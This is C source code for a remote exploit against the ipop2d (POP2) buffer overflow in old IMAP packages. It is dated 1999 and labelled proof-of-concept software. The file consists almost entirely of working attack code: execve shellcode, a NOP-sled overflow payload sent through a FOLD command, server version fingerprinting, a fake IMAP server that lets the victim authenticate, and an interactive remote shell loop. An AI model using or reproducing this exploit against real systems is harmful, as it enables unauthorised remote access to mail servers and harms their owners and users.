/*
 * $Id: ipop2ex.c,v 1.1.1.2 2004/04/17 09:30:08 bind Exp $
 *
 * Description: Linux exploit for ipop2d buffer overflow
 *
 * Author: bind (bind@gravitino.net)
 *
 * Details: A buffer overflow exists in the pop2 server distributed
 * with imap packages 4.4 and earlier. Exploitation of this bug allows
 * remote access to the machine with the user id of nobody. This program
 * allows you to exploit pop2 without the need of a third party IMAP server.
 * If you are behind firewalls, etc.  Resort to using a third party IMAP
 * server.  For accuracy purposes, this exploit autodetects the version of
 * the server it is exploiting and performs alignment calculation.
 *
 * Copyright (c) 1999 bind@gravitino.net All rights reserved
 *
 * THIS IS PROOF OF CONCEPT SOFTWARE.  IN NO EVENT SHALL THE AUTHOR BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR 
 * CONSEQUENTIAL DAMAGES RESULTING FROM THE USE OR MISUSE OF THIS SOFTWARE.
 *
 */

#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define RET 0xbffff64e
#define max(a, b) ((a) > (b) ? (a):(b))

int shell(int);
int imap_server();
void usage(char *);
int connection(char *);
int get_version(char *);
unsigned long resolve(char *);

char shellcode[] = 
  "\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
  "\x89\xe3\x52\x54\x54\x59\x6a\x0b\x58\xcd\x80";

struct platform {
  char *version;
  int offset;
  int align;
};

struct platform targets[4] = 
{
  { "v4.46", 0, 3 }, 
  { "v3.44", 0, 0 },
  { "v3.35", 0, 0 },
  { NULL, 0, 0 }
};

int main(int argc, char **argv)
{
  int sockfd, i, opt, align, offset, t;
  char *host, *local, *imap, *user, *pass;
  unsigned long addr;
  char sendbuf[1024], voodoo[1004], hello[50];
  struct platform *target;

  host = local = imap = user = pass = NULL;
  t = -1;
  offset = align = 0;

  setvbuf(stdout, NULL, _IONBF, 0);

  printf("Linux ipop2d buffer overflow exploit by bind / 1999\n\n");

  while((opt = getopt(argc, argv, "v:l:i:u:p:a:o:t:")) != EOF) {
    switch(opt) {
      case 'v': host = optarg; break;
      case 'l': local = optarg; break;
      case 'i': imap = optarg; break;
      case 'u': user = optarg; break;
      case 'p': pass = optarg; break;
      case 'a': align = atoi(optarg); break;
      case 'o': offset = atoi(optarg); break;
      case 't': t = atoi(optarg); break;
      default: usage(argv[0]); break;
    }
  }

  if(!host) 
    usage(argv[0]);
 
  if(!local && !imap) {
    printf("Must specify an IMAP server or your local ip address\n");
    exit(-1);
  }

  if(imap && !user) {
    printf("Must specify a username for third-party IMAP server\n");
    exit(-1);
  }

  if(imap && !pass) {
    printf("Must specify a password for third-party IMAP server\n");
    exit(-1);
  }

  if(!imap) {
    if(geteuid()) {
      printf("Error: You must have root access to use pseudo IMAP server\n");
      exit(-1);
    }
  }

  if(t < 0) {
    printf("Identifying server version.");
    t = get_version(host);
  }

  target = &targets[t];

  if(imap)
    snprintf(hello, sizeof(hello), "HELO %s:%s %s\r\n", imap, user, pass);
  else 
    snprintf(hello, sizeof(hello), "HELO %s:test test\r\n", local);

  align +=  64 - (strlen(hello) - 2);

  sockfd = connection(host);
  if(sockfd < 0) {
    printf(".failed\n");
    exit(-1);
  }

  send(sockfd, hello, strlen(hello), 0);

  if(!imap) {
    if(imap_server() < 0) {
      close(sockfd);
      exit(-1);
    }
  } else { 
    printf("Waiting for POP2 to authenticate with IMAP server");
    for(i = 0; i < 10; i++) {
      printf(".");
      sleep(1);
      if(i == 9) printf("completed\n");
    }
  }
 
  putchar('\n');


  memset(voodoo, 0x90, 1004);
  memcpy(voodoo + 500, shellcode, strlen(shellcode));

  addr = RET - target->offset - offset;

  for(i = (strlen(shellcode) + (600 + target->align+align)); i <= 1004; i += 4)
    *(long *)&voodoo[i] = addr;

  snprintf(sendbuf, sizeof(sendbuf), "FOLD %s\n", voodoo);
  send(sockfd, sendbuf, strlen(sendbuf), 0);

  shell(sockfd);

  exit(0);
}

int get_version(char *host)
{
  int sockfd, i;
  char recvbuf[1024];

  sockfd = connection(host);
  if(sockfd < 0) 
    return(-1);

  recv(sockfd, recvbuf, sizeof(recvbuf), 0);

  for(i = 0; targets[i].version != NULL; i++) {
    printf(".");
    if(strstr(recvbuf, targets[i].version) != NULL) {
      printf("adjusted for %s\n", targets[i].version);
      close(sockfd);
      return(i);
    }
  }

  close(sockfd);
  printf("no adjustments made\n");
  return(0);
}

int connection(char *host)
{
  int sockfd, c;
  struct sockaddr_in sin;

  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if(sockfd < 0)
    return(sockfd);

  sin.sin_family = AF_INET;
  sin.sin_port = htons(109);
  sin.sin_addr.s_addr = resolve(host);

  c = connect(sockfd, (struct sockaddr *)&sin, sizeof(sin));
  if(c < 0) {
    close(sockfd);
    return(c);
  }

  return(sockfd);
}

int imap_server()
{
  int ssockfd, csockfd, clen;
  struct sockaddr_in ssin, csin;
  char sendbuf[1024], recvbuf[1024];

  ssockfd = socket(AF_INET, SOCK_STREAM, 0);
  if(ssockfd < 0)
    return(ssockfd);

  ssin.sin_family = AF_INET;
  ssin.sin_port = ntohs(143);
  ssin.sin_addr.s_addr = INADDR_ANY;

  if(bind(ssockfd, (struct sockaddr *)&ssin, sizeof(ssin)) < 0) {
    printf("\nError: bind() failed\n");
    return(-1);
  }

  printf("Pseudo IMAP server waiting for connection.");

  if(listen(ssockfd, 10) < 0) {
    printf("\nError: listen() failed\n");
    return(-1);
  }

  printf(".");

  clen = sizeof(csin);
  memset(&csin, 0, sizeof(csin));

  csockfd = accept(ssockfd, (struct sockaddr *)&csin, &clen);
  if(csockfd < 0) {
    printf("\n\nError: accept() failed\n");
    close(ssockfd);
    return(-1);
  }

  printf(".");

  snprintf(sendbuf, sizeof(sendbuf), "* OK localhost IMAP4rev1 2001\r\n");

  send(csockfd, sendbuf, strlen(sendbuf), 0);
  recv(csockfd, recvbuf, sizeof(recvbuf), 0);

  printf(".");

  snprintf(sendbuf, sizeof(sendbuf),
    "* CAPABILITY IMAP4REV1 IDLE NAMESPACE MAILBOX-REFERRALS SCAN SORT "
    "THREAD=REFERENCES THREAD=ORDEREDSUBJECT MULTIAPPEND LOGIN-REFERRALS "
    "AUTH=LOGIN\r\n00000000 OK CAPABILITY completed\r\n");

  send(csockfd, sendbuf, strlen(sendbuf), 0);
  recv(csockfd, recvbuf, sizeof(recvbuf), 0);

  printf(".");

  snprintf(sendbuf, sizeof(sendbuf), "+ VXNlciBOYW1lAA==\r\n");
  send(csockfd, sendbuf, strlen(sendbuf), 0);
  recv(csockfd, recvbuf, sizeof(recvbuf), 0);

  printf(".");

  snprintf(sendbuf, sizeof(sendbuf), "+ UGFzc3dvcmQA\r\n");
  send(csockfd, sendbuf, strlen(sendbuf), 0);
  recv(csockfd, recvbuf, sizeof(recvbuf), 0);

  printf(".");

  snprintf(sendbuf, sizeof(sendbuf),
    "* CAPABILITY IMAP4REV1 IDLE NAMESPACE MAILBOX-REFERRALS SCAN SORT "
    "THREAD=REFERENCES THREAD=ORDEREDSUBJECT MULTIAPPEND\r\n"
    "00000001 OK AUTHENTICATE completed\r\n");

  send(csockfd, sendbuf, strlen(sendbuf), 0);
  recv(csockfd, recvbuf, sizeof(recvbuf), 0);

  printf(".");

  snprintf(sendbuf, sizeof(sendbuf), 
    "* 0 EXISTS\r\n* 0 RECENT\r\n"
    "* OK [UIDVALIDITY 1] UID validity status\r\n"
    "* OK [UIDNEXT 1] Predicted next UID\r\n"
    "* FLAGS (\\Answered \\Flagged \\Deleted \\Draft \\Seen)\r\n"
    "* OK [PERMANENT FLAGS () ] Permanent flags\r\n"
    "00000002 OK [ READ-WRITE] SELECT completed\r\n");
  
  send(csockfd, sendbuf, strlen(sendbuf), 0);

  printf("completed\n");

  close(csockfd);
  close(ssockfd);

  return(0);
} 

int shell(int sockfd)
{
  fd_set fds;
  int fmax, ret;
  char buf[1024];

  fmax = max(fileno(stdin), sockfd) + 1;

  for(;;) {
    FD_ZERO(&fds);
    FD_SET(fileno(stdin), &fds);
    FD_SET(sockfd, &fds);
    if(select(fmax, &fds, NULL, NULL, NULL) < 0) {
      perror("select()");
      close(sockfd);
      exit(-1);
    }
    if(FD_ISSET(sockfd, &fds)) {
      bzero(buf, sizeof buf);
      if((ret = recv(sockfd, buf, sizeof buf, 0)) < 0) {
        perror("recv()");
        close(sockfd);
        exit(-1);
      }
      if(!ret) {
        fprintf(stderr, "Connection closed\n");
        close(sockfd);
        exit(-1);
      }
      write(fileno(stdout), buf, ret);
    }
    if(FD_ISSET(fileno(stdin), &fds)) {
      bzero(buf, sizeof buf);
      ret = read(fileno(stdin), buf, sizeof buf);
      errno = 0;
      if(send(sockfd, buf, ret, 0) != ret) {
        if(errno)
          perror("send()");
        else
          fprintf(stderr, "Transmission loss\n");
        close(sockfd);
        exit(-1);
      }
    }
  }
}

void usage(char *arg)
{
  int i;

  printf("Usage: %s [-v <victim>] [-l <localhost>] [-t <target>] [options]\n"
         "\nOptions:\n"
         "  [-i <imap server>]\n"
         "  [-u <imap username]\n"
         "  [-p <imap password]\n"
         "  [-a <alignment>]\n"
         "  [-o <offset>]\n"
         "\nTargets:\n", arg);

  for(i = 0; targets[i].version != NULL; i++)
    printf("  [%d] - POP2 %s\n", i, targets[i].version);
  exit(-1);
}

unsigned long resolve(char *hostname)
{
  struct sockaddr_in sin;
  struct hostent *hent;

  hent = gethostbyname(hostname);
  if(!hent)
    return 0;

  bzero((char *) &sin, sizeof(sin));
  memcpy((char *) &sin.sin_addr, hent->h_addr, hent->h_length);
  return sin.sin_addr.s_addr;
}
